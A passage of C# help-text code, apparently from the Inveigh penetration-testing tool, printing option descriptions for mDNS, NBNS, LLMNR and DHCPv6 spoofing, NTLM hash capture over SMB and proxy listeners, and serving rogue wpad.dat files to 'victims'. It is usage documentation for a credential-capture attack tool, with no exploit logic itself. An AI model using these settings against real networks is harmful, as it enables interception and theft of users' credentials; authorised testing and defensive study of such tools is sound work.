                Console.WriteLine(" -mDNSQuestions           Default = QU,QM: Comma separated list of mDNS question types to spoof. Note that QM will");
                Console.WriteLine("                          send the response to 224.0.0.251. Types include QU = Query Unicast, QM = Query Multicast");
            }

            if (nullarg || String.Equals(arg, "MDNSTYPES"))
            {
                Console.WriteLine(" -mDNSTypes               Default = A: Comma separated list of mDNS record types to spoof.");
            }

            if (nullarg || String.Equals(arg, "NBNS"))
            {
                Console.WriteLine(" -NBNS                    Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.");
            }

            if (nullarg || String.Equals(arg, "NBNSTTL"))
            {
                Console.WriteLine(" -NBNSTTL                 Default = 165 Seconds: NBNS TTL in seconds for the response packet.");
            }

            if (nullarg || String.Equals(arg, "NBNSTYPES"))
            {
                Console.WriteLine(" -NBNSTypes               Default = 00,20: Comma separated list of NBNS types to spoof. Note, not all types have");
                Console.WriteLine("                          been tested. Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server");
                Console.WriteLine("                          Service, 1B = Domain Name");
            }

            if (nullarg || String.Equals(arg, "PCAP"))
            {
                Console.WriteLine(" -Pcap                    Default = Disabled: (Y/N) Enable/Disable IPv4 TCP/UDP pcap output.");
            }

            if (nullarg || String.Equals(arg, "PCAPPORTTCP"))
            {
                Console.WriteLine(" -PcapPortTCP             Default = 139,445: Comma separated list of TCP ports to filter which packets will be");
                Console.WriteLine("                          written to the pcap file. Use 'All' to capture on all ports.");
            }

            if (nullarg || String.Equals(arg, "PCAPPORTUDP"))
            {
                Console.WriteLine(" -PcapPortUDP             Default = Disabled: Comma separated list of UDP ports to filter which packets will be");
                Console.WriteLine("                          written to the pcap file. Use 'All' to capture on all ports.");
            }

            if (nullarg || String.Equals(arg, "PROXY"))
            {
                Console.WriteLine(" -Proxy                   Default = Disabled: (Y/N) Enable/Disable proxy listener authentication captures.");
            }

            if (nullarg || String.Equals(arg, "PROXYIP"))
            {
                Console.WriteLine(" -ProxyIP                 Default = Any: IP address for the proxy listener.");
            }

            if (nullarg || String.Equals(arg, "PROXYPORT"))
            {
                Console.WriteLine(" -ProxyPort               Default = 8492: TCP port for the proxy listener.");
            }

            if (nullarg || String.Equals(arg, "PROXYIGNORE"))
            {
                Console.WriteLine(" -ProxyIgnore             Default = Firefox: Comma separated list of keywords to use for filtering browser");
                Console.WriteLine("                          user agents. Matching browsers will not be sent the wpad.dat file used for capturing");
                Console.WriteLine("                          proxy authentications.Firefox does not work correctly with the proxy server failover");
                Console.WriteLine("                          setup.Firefox will be left unable to connect to any sites until the proxy is cleared.");
                Console.WriteLine("                          Remove 'Firefox' from this list to attack Firefox. If attacking Firefox, consider");
                Console.WriteLine("                          setting -SpooferRepeat N to limit attacks against a single target so that victims can");
                Console.WriteLine("                          recover Firefox connectivity by closing and reopening.");
            }

            if (nullarg || String.Equals(arg, "RUNCOUNT"))
            {
                Console.WriteLine(" -RunCount                Default = Unlimited: (Integer) Number of NTLMv1/NTLMv2 captures to perform before");
                Console.WriteLine("                          auto-exiting.");
            }

            if (nullarg || String.Equals(arg, "RUNTIME"))
            {
                Console.WriteLine(" -RunTime                 Default = Disabled: Run time duration in minutes.");
            }

            if (nullarg || String.Equals(arg, "SMB"))
            {
                Console.WriteLine(" -SMB                     Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning,");
                Console.WriteLine("                          LLMNR/NBNS spoofing can still direct targets to the host system's SMB server.");
                Console.WriteLine("                          Block TCP ports 445/139 or kill the SMB services if you need to prevent login");
                Console.WriteLine("                          equests from being processed by the Inveigh host.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERDOMAINSIGNORE"))
            {
                Console.WriteLine(" -SpooferDomainsIgnore    Default = All: Comma separated list of requested domains to ignore when spoofing");
                Console.WriteLine("                          with DNS.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERDOMNAINSREPLY"))
            {
                Console.WriteLine(" -SpooferDomainsReply     Default = All: Comma separated list of requested domains to respond to when spoofing");
                Console.WriteLine("                          with DNS.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERHOSTSIGNORE"))
            {
                Console.WriteLine(" -SpooferHostsIgnore      Default = All: Comma separated list of requested hostnames to ignore when spoofing.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERHOSTSREPLY"))
            {
                Console.WriteLine(" -SpooferHostsReply       Default = All: Comma separated list of requested hostnames to respond to when spoofing.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERIP"))
            {
                Console.WriteLine(" -SpooferIP               IP address for spoofing. This arg is only necessary when redirecting victims to a system");
                Console.WriteLine("                          other than the Inveigh host.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERIPV6"))
            {
                Console.WriteLine(" -SpooferIPv6             IPv6 address for DHCPv6/LLMNR spoofing. This arg is only necessary when redirecting victims");
                Console.WriteLine("                          to a system other than the Inveigh host. For DHCPv6, this will be the assigned DNS server IP.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERIPSIGNORE"))
            {
                Console.WriteLine(" -SpooferIPsIgnore        Default = All: Comma separated list of source IP addresses to ignore when spoofing.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERIPSREPLY"))
            {
                Console.WriteLine(" -SpooferIPsReply         Default = All: Comma separated list of source IP addresses to respond to when spoofing.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERMACSIGNORE"))
            {
                Console.WriteLine(" -SpooferMACsIgnore       Default = All: Comma separated list of MAC addresses to ignore when DHCPv6 spoofing.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERMACSREPLY"))
            {
                Console.WriteLine(" -SpooferMACsReply        Default = All: Comma separated list of MAC addresses to respond to when DHCPv6 spoofing.");
            }

            if (nullarg || String.Equals(arg, "SPOOFERREPEAT"))
            {
                Console.WriteLine(" -SpooferRepeat           Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/ NBNS spoofs to a victim system");
                Console.WriteLine("                          after one user challenge/response has been captured.");
            }

            if (nullarg || String.Equals(arg, "WPADAUTH"))
            {
                Console.WriteLine(" -WPADAuth                Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type");
                Console.WriteLine("                          for wpad.dat requests. Setting to Anonymous can prevent browser login prompts. NTLMNoESS ");
                Console.WriteLine("                          turns off the 'Extended Session Security' flag during negotiation.");
            }

            if (nullarg || String.Equals(arg, "WPADIP"))
            {
                Console.WriteLine(" -WPADIP                  Proxy server IP to be included in the wpad.dat response for WPAD enabled browsers. This");
                Console.WriteLine("                          parameter must be used with WPADPort.");
            }

            if (nullarg || String.Equals(arg, "WPADPORT"))
            {
                Console.WriteLine(" -WPADPort                Proxy server port to be included in the wpad.dat response for WPAD enabled browsers. This");
                Console.WriteLine("                          parameter must be used with WPADIP.");
            }

            if (nullarg || String.Equals(arg, "WPADRESPONSE"))
            {
                Console.WriteLine(" -WPADResponse            wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if");
                Console.WriteLine("                          WPADIP and WPADPort are set. Use C# character escapes where necessary.");
            }

            Console.WriteLine();
        }

    }

}
